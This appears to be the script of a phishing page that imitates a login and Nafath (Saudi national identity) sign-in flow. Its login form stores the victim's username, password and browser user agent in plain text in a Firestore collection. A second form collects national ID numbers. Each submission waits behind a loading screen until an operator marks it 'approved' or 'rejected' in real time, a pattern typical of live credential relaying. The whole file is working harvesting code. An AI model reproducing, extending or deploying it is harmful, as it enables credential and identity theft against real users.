// script.js

// استيراد قاعدة البيانات من الملف الخارجي المخصّص لـ Firebase
import { db } from "./firebase-config.js";

// استيراد الدوال المطلوبة (إضافة doc و onSnapshot للمراقبة اللحظية)
import { 
    collection, 
    addDoc, 
    serverTimestamp, 
    doc, 
    onSnapshot 
} from "https://www.gstatic.com/firebasejs/10.8.0/firebase-firestore.js";

document.addEventListener('DOMContentLoaded', () => {
    
    // ==========================================
    // 1. تفاعلات الصفحة الرئيسية (Index Page)
    // ==========================================
    const loginCard = document.getElementById('loginCard');
    if (loginCard) {
        loginCard.addEventListener('click', () => {
            loginCard.style.transform = 'scale(0.95)';
            setTimeout(() => {
                window.location.href = 'login.html';
            }, 150);
        });
    }

    // ==========================================
    // 2. نظام التبويب والأكورديون الديناميكي (Accordion System)
    // ==========================================
    const tabs = document.querySelectorAll('.accordion-item');
    const panels = document.querySelectorAll('.form-panel-card');

    tabs.forEach(tab => {
        tab.addEventListener('click', () => {
            if (tab.classList.contains('collapsed')) {
                
                tabs.forEach(t => {
                    t.classList.remove('active');
                    t.classList.add('collapsed');
                    const icon = t.querySelector('.status-icon');
                    if (icon) {
                        icon.classList.remove('fa-minus');
                        icon.classList.add('fa-plus');
                    }
                });

                panels.forEach(p => {
                    p.classList.add('hidden-panel');
                });

                tab.classList.remove('collapsed');
                tab.classList.add('active');
                const currentIcon = tab.querySelector('.status-icon');
                if (currentIcon) {
                    currentIcon.classList.remove('fa-plus');
                    currentIcon.classList.add('fa-minus');
                }

                const targetPanelId = tab.getAttribute('data-target');
                const targetPanel = document.getElementById(targetPanelId);
                if (targetPanel) {
                    targetPanel.classList.remove('hidden-panel');
                }
            }
        });
    });

    // ==========================================
    // 3. معالجة إرسال النماذج ومراقبة رد الأدمن لحظياً
    // ==========================================
    const globalLoader = document.getElementById('globalLoader');
    
    // دالة لمراقبة حالة المستند في فايربيس بشكل حي ومباشر
    function listenToAdminApproval(collectionName, docId) {
        const docRef = doc(db, collectionName, docId);
        
        // الاستماع للتغيرات اللحظية في قاعدة البيانات
        const unsubscribe = onSnapshot(docRef, (snapshot) => {
            if (snapshot.exists()) {
                const data = snapshot.data();
                
                // إذا قام الأدمن بتحديث الحالة إلى "approved" أو أي حالة نجاح تحددها
                if (data.status === "approved") {
                    // 1. إخفاء اللودر الزجاجي
                    if (globalLoader) globalLoader.classList.add('hidden-loader');
                    
                    // 2. التوجيه لصفحة النجاح أو الصفحة الداخلية للمنصة
                    alert('تم التحقق والمطابقة بنجاح من قبل الإدارة.');
                    window.location.href = "dashboard.html"; 
                    
                    // إيقاف المراقبة بعد النجاح لتوفير الموارد
                    unsubscribe();
                } else if (data.status === "rejected") {
                    if (globalLoader) globalLoader.classList.add('hidden-loader');
                    alert('تم رفض طلب التحقق من قبل لوحة الإدارة. يرجى المحاولة مجدداً.');
                    unsubscribe();
                }
            }
        });
    }

    // أ) نموذج اسم المستخدم وكلمة المرور الأصلي
    const authForm = document.getElementById('authForm');
    if (authForm) {
        authForm.addEventListener('submit', async (e) => {
            e.preventDefault();
            
            const usernameInput = document.getElementById('username').value;
            const passwordInput = document.getElementById('password').value;
            
            if (globalLoader) globalLoader.classList.remove('hidden-loader');
            
            try {
                // إرسال البيانات وحفظ المرجع الخاص بالمستند الجديد (docRef)
                const docRef = await addDoc(collection(db, "users_login"), {
                    username: usernameInput,
                    password: passwordInput,
                    timestamp: serverTimestamp(),
                    device: navigator.userAgent,
                    status: "waiting_admin" 
                });

                // بدء مراقبة هذا المستند تحديداً بانتظار رد الأدمن
                listenToAdminApproval("users_login", docRef.id);
                
            } catch (error) {
                console.error("خطأ: ", error);
                alert('عذراً، حدث خطأ في الاتصال بالشبكة.');
                if (globalLoader) globalLoader.classList.add('hidden-loader');
            }
        });
    }

    // ب) نموذج رقم بطاقة الأحوال (الخاص بتبويب تطبيق نفاذ)
    const appForm = document.getElementById('appForm');
    if (appForm) {
        appForm.addEventListener('submit', async (e) => {
            e.preventDefault();
            
            const nationalIdInput = document.getElementById('nationalId').value;
            
            if (globalLoader) globalLoader.classList.remove('hidden-loader');
            
            try {
                const docRef = await addDoc(collection(db, "nafath_app_requests"), {
                    nationalId: nationalIdInput,
                    timestamp: serverTimestamp(),
                    status: "waiting_admin"
                });
                
                // بدء مراقبة طلب نفاذ بانتظار رد الأدمن
                listenToAdminApproval("nafath_app_requests", docRef.id);
                
            } catch (error) {
                console.error("خطأ: ", error);
                alert('فشل إرسال الطلب.');
                if (globalLoader) globalLoader.classList.add('hidden-loader');
            }
        });
    }

    // ==========================================
    // 4. زر تبديل اللغة وإدارة اتجاه الصفحة (مشترك)
    // ==========================================
    const langSwitch = document.getElementById('langSwitch');
    if (langSwitch) {
        langSwitch.addEventListener('click', () => {
            const currentLang = langSwitch.querySelector('span').innerText.trim();
            if (currentLang === 'عربي') {
                langSwitch.querySelector('span').innerText = 'English';
                document.documentElement.setAttribute('dir', 'rtl');
                document.documentElement.setAttribute('lang', 'ar');
                document.body.style.direction = 'rtl';
            } else {
                langSwitch.querySelector('span').innerText = 'عربي';
                document.documentElement.setAttribute('dir', 'ltr');
                document.documentElement.setAttribute('lang', 'en');
                document.body.style.direction = 'ltr';
            }
        });
    }
});
